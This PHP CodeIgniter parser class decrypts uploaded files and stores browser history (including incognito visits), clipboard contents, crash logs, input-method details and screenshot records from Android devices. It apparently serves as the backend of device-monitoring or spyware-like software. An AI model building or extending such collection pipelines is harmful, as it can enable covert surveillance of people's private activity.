<?php

namespace App\Libraries\Parsers;

use App\Models\CryptModel;
use CodeIgniter\Database\BaseConnection;

class UserPrivacyParser
{
    protected BaseConnection $db;

    public function __construct(BaseConnection $db)
    {
        $this->db = $db;
    }

    /**
     * Normalize a parser payload into a decoded associative array.
     */
    protected function payloadToArray(string|array $payload, string $file_name): ?array
    {
        if (is_array($payload)) {
            return $payload;
        }

        $cryptModel = new CryptModel();
        $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
        if ($raw === false) {
            log_message('error', '[payloadToArray] Cannot read file: ' . $file_name);
            return null;
        }

        $decoded = $cryptModel->decode_content($raw);
        if ($decoded === false) {
            log_message('error', '[payloadToArray] Decryption failed: ' . $file_name);
            return null;
        }

        $json = json_decode($decoded, true);
        if ($json === null) {
            log_message('error', '[payloadToArray] JSON decode failed: ' . $file_name);
            return null;
        }

        return $json;
    }

    /**
     * BrowserHistoryExtractor
     * File prefix: browser_history_TIMESTAMP.enc
     */
    public function parse_browser_history(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['history_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $item) {
                $url = $item['url'] ?? null;
                if (!$url) continue;

                $exists = $this->db->table('tbl_extracted_browser_history')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('url', $url)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'browser_package' => $item['browser_package'] ?? null,
                    'url' => $url,
                    'title' => $item['title'] ?? null,
                    'visit_count' => $item['visit_count'] ?? null,
                    'last_visit_time' => $item['last_visit_time'] ?? null,
                    'typed_count' => $item['typed_count'] ?? null,
                    'favicon_base64' => $item['favicon_base64'] ?? null,
                    'is_bookmark' => isset($item['is_bookmark']) ? ($item['is_bookmark'] ? 1 : 0) : 0,
                    'bookmark_folder' => $item['bookmark_folder'] ?? null,
                    'transition_type' => $item['transition_type'] ?? null,
                    'referrer_url' => $item['referrer_url'] ?? null,
                    'visit_duration_ms' => $item['visit_duration_ms'] ?? null,
                    'search_terms' => $item['search_terms'] ?? null,
                    'is_incognito' => isset($item['is_incognito']) ? ($item['is_incognito'] ? 1 : 0) : 0,
                    'domain' => $item['domain'] ?? null,
                    'scheme' => $item['scheme'] ?? null,
                    'path_depth' => $item['path_depth'] ?? null,
                    'query_params' => $item['query_params'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_extracted_browser_history')->insertBatch($batch);
            }

            log_message('info', '[parse_browser_history] Inserted ' . count($batch) . ' history rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_browser_history] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ClipboardExtractor
     * File prefix: clipboard_TIMESTAMP.enc
     */
    public function parse_clipboard(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'clip_data_type' => $json['clip_data_type'] ?? null,
                'clip_text' => $json['clip_text'] ?? null,
                'clip_html' => $json['clip_html'] ?? null,
                'clip_intent_action' => $json['clip_intent_action'] ?? null,
                'clip_intent_package' => $json['clip_intent_package'] ?? null,
                'clip_uri' => $json['clip_uri'] ?? null,
                'item_count' => $json['item_count'] ?? null,
                'primary_clip_description' => $json['primary_clip_description'] ?? null,
                'timestamp' => $json['timestamp'] ?? null,
                'source_package' => $json['source_package'] ?? null,
                'label' => $json['label'] ?? null,
                'is_sensitive' => isset($json['is_sensitive']) ? ($json['is_sensitive'] ? 1 : 0) : 0,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_extracted_clipboard_entries')->insert($data);
            log_message('info', '[parse_clipboard] Inserted clipboard snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_clipboard] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AppCrashLogExtractor
     * File prefix: crash_logs_TIMESTAMP.enc
     */
    public function parse_crash_logs(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['crash_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $crash) {
                $pid = $crash['pid'] ?? null;
                $crashTime = $crash['crash_time'] ?? null;
                if ($pid === null || !$crashTime) continue;

                $exists = $this->db->table('tbl_system_crash_logs')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('pid', $pid)
                    ->where('crash_time', $crashTime)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'package_name' => $crash['package_name'] ?? null,
                    'process_name' => $crash['process_name'] ?? null,
                    'pid' => $pid,
                    'uid' => $crash['uid'] ?? null,
                    'crash_time' => $crashTime,
                    'crash_type' => $crash['crash_type'] ?? null,
                    'exception_class' => $crash['exception_class'] ?? null,
                    'exception_message' => $crash['exception_message'] ?? null,
                    'stack_trace' => $crash['stack_trace'] ?? null,
                    'build_fingerprint' => $crash['build_fingerprint'] ?? null,
                    'android_version' => $crash['android_version'] ?? null,
                    'device_model' => $crash['device_model'] ?? null,
                    'is_system_app' => isset($crash['is_system_app']) ? ($crash['is_system_app'] ? 1 : 0) : 0,
                    'is_silent' => isset($crash['is_silent']) ? ($crash['is_silent'] ? 1 : 0) : 0,
                    'is_user_perceived' => isset($crash['is_user_perceived']) ? ($crash['is_user_perceived'] ? 1 : 0) : 0,
                    'logcat_tail' => $crash['logcat_tail'] ?? null,
                    'dropbox_tag' => $crash['dropbox_tag'] ?? null,
                    'dropbox_data' => $crash['dropbox_data'] ?? null,
                    'tombstone_path' => $crash['tombstone_path'] ?? null,
                    'minidump_path' => $crash['minidump_path'] ?? null,
                    'last_crash_time' => $crash['last_crash_time'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_system_crash_logs')->insertBatch($batch);
            }

            log_message('info', '[parse_crash_logs] Inserted ' . count($batch) . ' crashes from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_crash_logs] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * KeyboardInputExtractor
     * File prefix: keyboard_input_TIMESTAMP.enc
     */
    public function parse_keyboard_input(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['ime_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $ime) {
                $imeId = $ime['ime_id'] ?? null;
                if (!$imeId) continue;

                $exists = $this->db->table('tbl_keyboard_input')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('ime_id', $imeId)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'ime_package' => $ime['ime_package'] ?? null,
                    'ime_id' => $imeId,
                    'ime_label' => $ime['ime_label'] ?? null,
                    'is_enabled' => isset($ime['is_enabled']) ? ($ime['is_enabled'] ? 1 : 0) : 0,
                    'is_default' => isset($ime['is_default']) ? ($ime['is_default'] ? 1 : 0) : 0,
                    'is_system_ime' => isset($ime['is_system_ime']) ? ($ime['is_system_ime'] ? 1 : 0) : 0,
                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
                    'supports_switching_to_next_input_method' => isset($ime['supports_switching_to_next_input_method']) ? ($ime['supports_switching_to_next_input_method'] ? 1 : 0) : 0,
                    'subtypes' => is_array($ime['subtypes'] ?? null) ? json_encode($ime['subtypes']) : ($ime['subtypes'] ?? null),
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_keyboard_input')->insertBatch($batch);
            }

            log_message('info', '[parse_keyboard_input] Inserted ' . count($batch) . ' IME rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_keyboard_input] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ScreenshotExtractor
     * File prefix: screenshots_TIMESTAMP.enc
     */
    public function parse_screenshots(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['screenshot_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $item) {
                $filePath = $item['file_path'] ?? null;
                $timestamp = $item['timestamp'] ?? null;
                if (!$filePath || !$timestamp) continue;

                $exists = $this->db->table('tbl_extracted_screenshots')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('file_path', $filePath)
                    ->where('timestamp', $timestamp)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'file_path' => $filePath,
                    'file_name' => $item['file_name'] ?? null,
                    'file_size' => $item['file_size'] ?? null,
                    'mime_type' => $item['mime_type'] ?? null,
                    'width' => $item['width'] ?? null,
                    'height' => $item['height'] ?? null,
                    'timestamp' => $timestamp,
                    'source_package' => $item['source_package'] ?? null,
                    'is_screen_record' => isset($item['is_screen_record']) ? ($item['is_screen_record'] ? 1 : 0) : 0,
                    'duration_ms' => $item['duration_ms'] ?? null,
                    'video_path' => $item['video_path'] ?? null,
                    'video_size' => $item['video_size'] ?? null,
                    'video_width' => $item['video_width'] ?? null,
                    'video_height' => $item['video_height'] ?? null,
                    'video_duration_ms' => $item['video_duration_ms'] ?? null,
                    'video_frame_rate' => $item['video_frame_rate'] ?? null,
                    'video_bitrate' => $item['video_bitrate'] ?? null,
                    'is_edited' => isset($item['is_edited']) ? ($item['is_edited'] ? 1 : 0) : 0,
                    'edit_timestamp' => $item['edit_timestamp'] ?? null,
                    'edit_app_package' => $item['edit_app_package'] ?? null,
                    'contains_pii' => isset($item['contains_pii']) ? ($item['contains_pii'] ? 1 : 0) : 0,
                    'pii_types' => is_array($item['pii_types'] ?? null) ? json_encode($item['pii_types']) : ($item['pii_types'] ?? null),
                    'detection_confidence' => $item['detection_confidence'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_extracted_screenshots')->insertBatch($batch);
            }

            log_message('info', '[parse_screenshots] Inserted ' . count($batch) . ' screenshots from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_screenshots] Exception: ' . $e->getMessage());
            return false;
        }
    }
}
